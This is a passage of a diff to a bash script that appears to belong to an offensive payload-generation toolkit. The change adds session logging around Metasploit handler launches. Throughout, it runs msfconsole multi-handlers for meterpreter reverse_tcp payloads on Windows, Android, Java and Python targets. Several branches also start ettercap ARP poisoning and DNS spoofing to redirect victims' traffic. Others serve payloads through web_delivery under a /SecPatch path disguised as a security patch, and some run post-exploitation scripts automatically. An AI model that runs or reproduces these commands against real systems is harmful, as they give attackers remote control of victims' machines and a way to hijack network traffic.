      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
-     xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD java/meterpreter/reverse_tcp; exploit'"
+       if [ "$MsFlF" = "ON" ]; then
+         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD java/meterpreter/reverse_tcp; exploit'"
+         cd $IPATH/output
+         # delete utf-8/non-ancii caracters from output
+         tr -cd '\11\12\15\40-\176' < report.log > final.log
+            sed -i "s/\[0m//g" final.log
+            sed -i "s/\[1m\[34m//g" final.log
+            sed -i "s/\[4m//g" final.log
+            sed -i "s/\[K//g" final.log
+            mv final.log $N4m-$lhost.log > /dev/null 2>&1
+            rm report.log > /dev/null 2>&1
+            cd $IPATH/
+       else
+         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD java/meterpreter/reverse_tcp; exploit'"
+       fi
+
 
    else
+
 
       # edit files nedded
       cd $IPATH/templates/phishing
@@ -3739,9 +4558,25 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD java/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          if [ "$MsFlF" = "ON" ]; then
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD java/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+            cd $IPATH/output
+            # delete utf-8/non-ancii caracters from output
+            tr -cd '\11\12\15\40-\176' < report.log > final.log
+            sed -i "s/\[0m//g" final.log
+            sed -i "s/\[1m\[34m//g" final.log
+            sed -i "s/\[4m//g" final.log
+            sed -i "s/\[K//g" final.log
+            mv final.log $N4m-$lhost.log > /dev/null 2>&1
+            rm report.log > /dev/null 2>&1
+            cd $IPATH/
+          else
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD java/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          fi
+
 
         else
+
 
         echo "- ATTACK VECTOR: http://$lhost"
         echo "---"
@@ -3749,9 +4584,21 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD java/meterpreter/reverse_tcp; exploit'"
-
-
+          if [ "$MsFlF" = "ON" ]; then
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD java/meterpreter/reverse_tcp; exploit'"
+            cd $IPATH/output
+            # delete utf-8/non-ancii caracters from output
+            tr -cd '\11\12\15\40-\176' < report.log > final.log
+            sed -i "s/\[0m//g" final.log
+            sed -i "s/\[1m\[34m//g" final.log
+            sed -i "s/\[4m//g" final.log
+            sed -i "s/\[K//g" final.log
+            mv final.log $N4m-$lhost.log > /dev/null 2>&1
+            rm report.log > /dev/null 2>&1
+            cd $IPATH/
+          else
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD java/meterpreter/reverse_tcp; exploit'"
+          fi
         fi
    fi
 
@@ -3817,9 +4664,25 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
-     xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'"
+       if [ "$MsFlF" = "ON" ]; then
+         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'"
+         cd $IPATH/output
+         # delete utf-8/non-ancii caracters from output
+         tr -cd '\11\12\15\40-\176' < report.log > final.log
+         sed -i "s/\[0m//g" final.log
+         sed -i "s/\[1m\[34m//g" final.log
+         sed -i "s/\[4m//g" final.log
+         sed -i "s/\[K//g" final.log
+         mv final.log $N4m-$lhost.log > /dev/null 2>&1
+         rm report.log > /dev/null 2>&1
+         cd $IPATH/
+       else
+         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'"
+       fi
+
 
    else
+
 
       # edit files nedded
       cd $IPATH/templates/phishing
@@ -3844,9 +4707,25 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          if [ "$MsFlF" = "ON" ]; then
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+            cd $IPATH/output
+            # delete utf-8/non-ancii caracters from output
+            tr -cd '\11\12\15\40-\176' < report.log > final.log
+            sed -i "s/\[0m//g" final.log
+            sed -i "s/\[1m\[34m//g" final.log
+            sed -i "s/\[4m//g" final.log
+            sed -i "s/\[K//g" final.log
+            mv final.log $N4m-$lhost.log > /dev/null 2>&1
+            rm report.log > /dev/null 2>&1
+            cd $IPATH/
+          else
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          fi
+
 
         else
+
 
         echo "- ATTACK VECTOR: http://$lhost"
         echo "---"
@@ -3854,9 +4733,21 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'"
-
-
+          if [ "$MsFlF" = "ON" ]; then
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'"
+            cd $IPATH/output
+            # delete utf-8/non-ancii caracters from output
+            tr -cd '\11\12\15\40-\176' < report.log > final.log
+            sed -i "s/\[0m//g" final.log
+            sed -i "s/\[1m\[34m//g" final.log
+            sed -i "s/\[4m//g" final.log
+            sed -i "s/\[K//g" final.log
+            mv final.log $N4m-$lhost.log > /dev/null 2>&1
+            rm report.log > /dev/null 2>&1
+            cd $IPATH/
+          else
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'"
+          fi
         fi
    fi
 
@@ -3975,19 +4866,48 @@ echo "- SEND THE URL GENERATED TO TARGET HOST"
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T "☠ WEB_DELIVERY MSF MODULE ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          if [ "$MsFlF" = "ON" ]; then
+            xterm -T "☠ WEB_DELIVERY MSF MODULE ☠" -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+            cd $IPATH/output
+            # delete utf-8/non-ancii caracters from output
+            tr -cd '\11\12\15\40-\176' < report.log > final.log
+            sed -i "s/\[0m//g" final.log
+            sed -i "s/\[1m\[34m//g" final.log
+            sed -i "s/\[4m//g" final.log
+            sed -i "s/\[K//g" final.log
+            mv final.log $N4m-$srvhost.log > /dev/null 2>&1
+            rm report.log > /dev/null 2>&1
+            cd $IPATH/
+          else
+            xterm -T "☠ WEB_DELIVERY MSF MODULE ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          fi
 
 
         else
 
+
         echo "- ATTACK VECTOR: http://$srvhost"
         echo "---"
+
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T "☠ WEB_DELIVERY MSF MODULE ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; exploit'"
-
+          if [ "$MsFlF" = "ON" ]; then
+            xterm -T "☠ WEB_DELIVERY MSF MODULE ☠" -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; exploit'"
+            cd $IPATH/output
+            # delete utf-8/non-ancii caracters from output
+            tr -cd '\11\12\15\40-\176' < report.log > final.log
+            sed -i "s/\[0m//g" final.log
+            sed -i "s/\[1m\[34m//g" final.log
+            sed -i "s/\[4m//g" final.log
+            sed -i "s/\[K//g" final.log
+            mv final.log $N4m-$srvhost.log > /dev/null 2>&1
+            rm report.log > /dev/null 2>&1
+            cd $IPATH/
+          else
+            xterm -T "☠ WEB_DELIVERY MSF MODULE ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; exploit'"
+          fi
         fi
 
 
@@ -4074,10 +4994,25 @@ echo "- SEND THE URL GENERATED TO TARGET HOST"
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T "☠ WEB_DELIVERY MSF MODULE ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          if [ "$MsFlF" = "ON" ]; then
+            xterm -T "☠ WEB_DELIVERY MSF MODULE ☠" -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+            cd $IPATH/output
+            # delete utf-8/non-ancii caracters from output
+            tr -cd '\11\12\15\40-\176' < report.log > final.log
+            sed -i "s/\[0m//g" final.log
+            sed -i "s/\[1m\[34m//g" final.log
+            sed -i "s/\[4m//g" final.log
+            sed -i "s/\[K//g" final.log
+            mv final.log $N4m-$srvhost.log > /dev/null 2>&1
+            rm report.log > /dev/null 2>&1
+            cd $IPATH/
+          else
+            xterm -T "☠ WEB_DELIVERY MSF MODULE ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          fi
 
 
         else
+
 
         echo "- ATTACK VECTOR: http://$srvhost"
         echo "---"
@@ -4085,8 +5020,21 @@ echo "- SEND THE URL GENERATED TO TARGET HOST"
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T "☠ WEB_DELIVERY MSF MODULE ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; exploit'"
-
+          if [ "$MsFlF" = "ON" ]; then
+            xterm -T "☠ WEB_DELIVERY MSF MODULE ☠" -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; exploit'"
+            cd $IPATH/output
+            # delete utf-8/non-ancii caracters from output
+            tr -cd '\11\12\15\40-\176' < report.log > final.log
+            sed -i "s/\[0m//g" final.log
+            sed -i "s/\[1m\[34m//g" final.log
+            sed -i "s/\[4m//g" final.log
+            sed -i "s/\[K//g" final.log
+            mv final.log $N4m-$srvhost.log > /dev/null 2>&1
+            rm report.log > /dev/null 2>&1
+            cd $IPATH/
+          else
+            xterm -T "☠ WEB_DELIVERY MSF MODULE ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; exploit'"
+          fi
         fi
 
 
@@ -4207,7 +5155,10 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -r $IPAT
         echo "[☯] Please dont test samples on virus total..."
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -r $IPATH/output/handler.rc" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
 
+
+
         else
+
 
         echo "- ATTACK VECTOR: http://$srvhost"
         echo "---"
@@ -4280,7 +5231,21 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
       echo "[☠] Start a multi-handler..."
       echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
       echo "[☯] Please dont test samples on virus total..."
-xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD android/meterpreter/reverse_tcp; exploit'"
+        if [ "$MsFlF" = "ON" ]; then
+          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD android/meterpreter/reverse_tcp; exploit'"
+          cd $IPATH/output
+          # delete utf-8/non-ancii caracters from output
+          tr -cd '\11\12\15\40-\176' < report.log > final.log
+          sed -i "s/\[0m//g" final.log
+          sed -i "s/\[1m\[34m//g" final.log
+          sed -i "s/\[4m//g" final.log
+          sed -i "s/\[K//g" final.log
+          mv final.log $N4m-$lhost.log > /dev/null 2>&1
+          rm report.log > /dev/null 2>&1
+          cd $IPATH/
+        else
+          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD android/meterpreter/reverse_tcp; exploit'"
+        fi
       sleep 2
 
    else
@@ -4307,9 +5272,25 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use 
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD android/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          if [ "$MsFlF" = "ON" ]; then
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD android/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+           cd $IPATH/output
+           # delete utf-8/non-ancii caracters from output
+           tr -cd '\11\12\15\40-\176' < report.log > final.log
+           sed -i "s/\[0m//g" final.log
+           sed -i "s/\[1m\[34m//g" final.log
+           sed -i "s/\[4m//g" final.log
+           sed -i "s/\[K//g" final.log
+           mv final.log $N4m-$lhost.log > /dev/null 2>&1
+           rm report.log > /dev/null 2>&1
+           cd $IPATH/
+          else
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD android/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          fi
+
 
         else
+
 
         echo "- ATTACK VECTOR: http://$lhost"
         echo "---"
@@ -4317,8 +5298,21 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use 
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD android/meterpreter/reverse_tcp; exploit'"
-
+          if [ "$MsFlF" = "ON" ]; then
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD android/meterpreter/reverse_tcp; exploit'"
+            cd $IPATH/output
+            # delete utf-8/non-ancii caracters from output
+            tr -cd '\11\12\15\40-\176' < report.log > final.log
+            sed -i "s/\[0m//g" final.log
+            sed -i "s/\[1m\[34m//g" final.log
+            sed -i "s/\[4m//g" final.log
+            sed -i "s/\[K//g" final.log
+            mv final.log $N4m-$lhost.log > /dev/null 2>&1
+            rm report.log > /dev/null 2>&1
+            cd $IPATH/
+          else
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD android/meterpreter/reverse_tcp; exploit'"
+          fi
         fi
    fi
 
@@ -4399,7 +5393,21 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
       echo "[☠] Start a multi-handler..."
       echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
       echo "[☯] Please dont test samples on virus total..."
-xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+        if [ "$MsFlF" = "ON" ]; then
+          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+          cd $IPATH/output
+          # delete utf-8/non-ancii caracters from output
+          tr -cd '\11\12\15\40-\176' < report.log > final.log
+          sed -i "s/\[0m//g" final.log
+          sed -i "s/\[1m\[34m//g" final.log
+          sed -i "s/\[4m//g" final.log
+          sed -i "s/\[K//g" final.log
+          mv final.log $N4m-$lhost.log > /dev/null 2>&1
+          rm report.log > /dev/null 2>&1
+          cd $IPATH/
+        else
+          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+        fi
       sleep 2
 
 
@@ -4441,9 +5449,25 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          if [ "$MsFlF" = "ON" ]; then
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          cd $IPATH/output
+          # delete utf-8/non-ancii caracters from output
+          tr -cd '\11\12\15\40-\176' < report.log > final.log
+          sed -i "s/\[0m//g" final.log
+          sed -i "s/\[1m\[34m//g" final.log
+          sed -i "s/\[4m//g" final.log
+          sed -i "s/\[K//g" final.log
+          mv final.log $N4m-$lhost.log > /dev/null 2>&1
+          rm report.log > /dev/null 2>&1
+          cd $IPATH/
+          else
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          fi
+
 
         else
+
 
         echo "- ATTACK VECTOR: http://$lhost"
         echo "- POST EXPLOIT : $P0"
@@ -4452,13 +5476,28 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
-
+          if [ "$MsFlF" = "ON" ]; then
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+            cd $IPATH/output
+            # delete utf-8/non-ancii caracters from output
+            tr -cd '\11\12\15\40-\176' < report.log > final.log
+            sed -i "s/\[0m//g" final.log
+            sed -i "s/\[1m\[34m//g" final.log
+            sed -i "s/\[4m//g" final.log
+            sed -i "s/\[K//g" final.log
+            mv final.log $N4m-$lhost.log > /dev/null 2>&1
+            rm report.log > /dev/null 2>&1
+            cd $IPATH/
+          else
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+          fi
         fi
    fi
 
 
 else
+
+
   echo "[x] Abort ...."
   sleep 2
 fi
@@ -4592,7 +5631,21 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
       echo "[☠] Start a multi-handler..."
       echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
       echo "[☯] Please dont test samples on virus total..."
-xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paa; exploit'"
+        if [ "$MsFlF" = "ON" ]; then
+          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paa; exploit'"
+          cd $IPATH/output
+          # delete utf-8/non-ancii caracters from output
+          tr -cd '\11\12\15\40-\176' < report.log > final.log
+          sed -i "s/\[0m//g" final.log
+          sed -i "s/\[1m\[34m//g" final.log
+          sed -i "s/\[4m//g" final.log
+          sed -i "s/\[K//g" final.log
+          mv final.log $N4m-$lhost.log > /dev/null 2>&1
+          rm report.log > /dev/null 2>&1
+          cd $IPATH/
+        else
+          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paa; exploit'"
+        fi
       sleep 2
 
 
@@ -4628,9 +5681,25 @@ fi
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
